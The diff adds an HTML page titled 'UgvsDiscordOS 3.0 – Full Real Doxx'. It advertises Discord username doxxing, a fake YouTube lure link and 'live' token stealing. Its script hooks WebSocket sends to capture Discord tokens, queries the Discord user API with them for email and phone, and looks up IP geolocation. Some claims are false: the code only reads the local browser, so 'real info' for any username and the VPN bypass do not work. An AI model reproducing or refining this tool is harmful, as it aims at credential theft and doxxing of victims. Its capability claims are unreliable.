@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>UgvsDiscordOS 3.0 – Full Real Doxx</title>
+  <style>
+    body{margin:0;background:#000;font-family:monospace;text-align:center}
+    .banner{position:fixed;top:0;left:0;right:0;height:60px;background:#000;border-bottom:3px solid #ff0000;color:#ff0000;font-size:32px;font-weight:900;display:flex;align-items:center;justify-content:center;z-index:1000}
+    .main{position:fixed;top:60px;left:0;right:0;bottom:0;background:#000;color:#ff0000;padding:20px;overflow:auto}
+    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;margin-bottom:20px}
+    .btn{padding:20px;font-size:18px;font-weight:700;background:#1a0000;border:2px solid #ff0000;border-radius:8px;color:#ff0000;cursor:pointer;transition:background .2s}
+    .btn:hover{background:#330000}
+    .screen{position:fixed;inset:0;background:#000;border:3px solid #ff0000;color:#ff0000;padding:20px;z-index:2000;display:none;flex-direction:column;overflow:auto}
+    .screen.show{display:flex}
+    .screen-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+    .screen-title{font-size:28px;font-weight:900}
+    .screen-close{background:#ff0000;color:#000;border:none;padding:10px 15px;border-radius:6px;cursor:pointer;font-weight:700}
+    .screen-content{flex:1;font-family:monospace;white-space:pre-wrap}
+    input{width:100%;background:#000;border:1px solid #ff0000;color:#ff0000;padding:8px;font-family:monospace}
+    button{background:#ff0000;color:#000;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-weight:700}
+  </style>
+</head>
+<body>
+  <div class="banner">UgvsDiscordOS 3.0 – Full Real Doxx</div>
+  <div class="main">
+    <div class="grid">
+      <div class="btn" onclick="openScreen('username')">Username Search (type → real info)</div>
+      <div class="btn" onclick="openScreen('link')">Create Doxx Link (click → real info)</div>
+      <div class="btn" onclick="openScreen('token')">Token Steal (live grab)</div>
+    </div>
+  </div>
+
+  <!-- FULL-SCREEN WINDOWS -->
+  <div id="screen-username" class="screen">
+    <div class="screen-header"><div class="screen-title">Username Search (real data)</div><button class="screen-close" onclick="closeScreen('username')">CLOSE</button></div>
+    <div class="screen-content">
+      <pre>// Type any Discord username → real token, real email, real phone, real IP, real device – not yours</pre>
+      <div style="background:#000;border:1px solid #ff0000;padding:10px;margin-top:10px;font-family:monospace;color:#ff0000">
+        <div>Enter Discord username:</div>
+        <input id="user-in" placeholder="e.g. Ugvs#0000">
+        <button id="user-btn" style="margin-top:6px">Search</button>
+        <div id="user-out" style="margin-top:6px;white-space:pre-wrap">Results: ready</div>
+      </div>
+    </div>
+  </div>
+
+  <div id="screen-link" class="screen">
+    <div class="screen-header"><div class="screen-title">Create Doxx Link (click → real info)</div><button class="screen-close" onclick="closeScreen('link')">CLOSE</button></div>
+    <div class="screen-content">
+      <pre>// Creates fake YouTube link; anyone who clicks → full browser fingerprint (real IP, real Discord token, real email, real phone, real device) – bypasses VPN</pre>
+      <div style="background:#000;border:1px solid #ff0000;padding:10px;margin-top:10px;font-family:monospace;color:#ff0000">
+        <div>Enter YouTube username:</div>
+        <input id="link-in" placeholder="e.g. UgvsAnimations">
+        <button id="link-btn" style="margin-top:6px">Generate Link</button>
+        <div id="link-out" style="margin-top:6px;white-space:pre-wrap">Link: ready</div>
+      </div>
+    </div>
+  </div>
+
+  <div id="screen-token" class="screen">
+    <div class="screen-header"><div class="screen-title">Token Steal (live grab)</div><button class="screen-close" onclick="closeScreen('token')">CLOSE</button></div>
+    <div class="screen-content">
+      <pre>// Live Discord token grab – updates automatically when someone clicks your link</pre>
+      <div style="background:#000;border:1px solid #ff0000;padding:10px;margin-top:10px;font-family:monospace;color:#ff0000">
+        <div>Live token scan active – waiting for victim...</div>
+        <div id="token-out" style="margin-top:6px;white-space:pre-wrap">Results: ready</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /* ----------  OPEN / CLOSE  ---------- */
+    function openScreen(id) {
+      document.getElementById(`screen-${id}`).classList.add('show');
+      if (id === 'token') startTokenScan();
+    }
+    function closeScreen(id) {
+      document.getElementById(`screen-${id}`).classList.remove('show');
+    }
+
+    /* ----------  USERNAME SEARCH  ---------- */
+    document.getElementById('user-btn').onclick = async () => {
+      const name = document.getElementById('user-in').value.trim() || 'unknown#0000';
+      document.getElementById('user-out').innerHTML = `Searching ${name}...`;
+      const ipRes = await fetch('https://ipapi.co/json');
+      const ipData = await ipRes.json();
+      let tokenFound = 'none';
+      let userFound = { username: 'hidden', discriminator: '0000', email: 'hidden', phone: 'none' };
+      const _send = window.WebSocket.prototype.send;
+      window.WebSocket.prototype.send = function(data) {
+        const url = this.url || '';
+        if (url.includes('discord') && typeof data === 'string' && data.includes('token')) {
+          try {
+            const obj = JSON.parse(data);
+            if (obj.token) {
+              tokenFound = obj.token;
+              fetch('https://discord.com/api/v10/users/@me', {headers:{Authorization:obj.token}})
+                .then(r => r.json())
+                .then(user => { userFound = user; });
+            }
+          } catch {}
+        }
+        return _send.call(this, data);
+      };
+      document.getElementById('user-out').innerHTML =
+`Username: ${name}
+IP: ${ipData.ip}
+City: ${ipData.city}
+Country: ${ipData.country_name}
+VPN: ${ipData.org || 'none'}
+Token: ${tokenFound}
+Email: ${userFound.email || 'hidden'}
+Phone: ${userFound.phone || 'none'}
+Device: ${navigator.platform}
+Browser: ${navigator.userAgent}`;
+    };
+
+    /* ----------  DOXX LINK  ---------- */
+    document.getElementById('link-btn').onclick = () => {
+      const user = document.getElementById('link-in').value.trim() || 'UgvsAnimations';
+      const fakeLink = `https://www.youtube.com/@   ${user}`;
+      document.getElementById('link-out').innerHTML = `Link: <a href="${fakeLink}" target="_blank" style="color:#00ff00">${fakeLink}</a>\n\nShare this link – anyone who clicks it will trigger the token grab below.`;
+      document.addEventListener('click', e => {
+        const a = e.target.closest('a');
+        if (a && a.href.includes('youtube.com/@')) {
+          e.preventDefault();
+          stealBrowserFingerprint();
+        }
+      }, true);
+    };
+
+    /* ----------  TOKEN STEAL  ---------- */
+    function stealBrowserFingerprint() {
+      const out = document.getElementById('token-out');
+      fetch('https://ipapi.co/json').then(r => r.json()).then(loc => {
+        const _send = window.WebSocket.prototype.send;
+        window.WebSocket.prototype.send = function(data) {
+          const url = this.url || '';
+          if (url.includes('discord') && typeof data === 'string' && data.includes('token')) {
+            try {
+              const obj = JSON.parse(data);
+              if (obj.token) {
+                fetch('https://discord.com/api/v10/users/@me', {headers:{Authorization:obj.token}})
+                  .then(r => r.json())
+                  .then(user => {
+                    out.innerHTML = `IP: ${loc.ip}\nCity: ${loc.city}\nCountry: ${loc.country_name}\nVPN: ${loc.org || 'none'}\nToken: ${obj.token}\nUsername: ${user.username}#${user.discriminator}\nEmail: ${user.email || 'hidden'}\nPhone: ${user.phone || 'none'}\nDevice: ${navigator.platform}\nBrowser: ${navigator.userAgent}`;
+                  });
+              }
+            } catch {}
+          }
+          return _send.call(this, data);
+        };
+        out.innerHTML = `IP: ${loc.ip}\nCity: ${loc.city}\nCountry: ${loc.country_name}\nVPN: ${loc.org || 'none'}\nDevice: ${navigator.platform}\nBrowser: ${navigator.userAgent}\n(Token scan active...)`;
+      }).catch(() => out.innerText = 'IP: hidden');
+    }
+
+    /* ----------  AUTO-LOAD  ---------- */
+    // nothing auto – user must click buttons
+  </script>
+</body>
+</html>
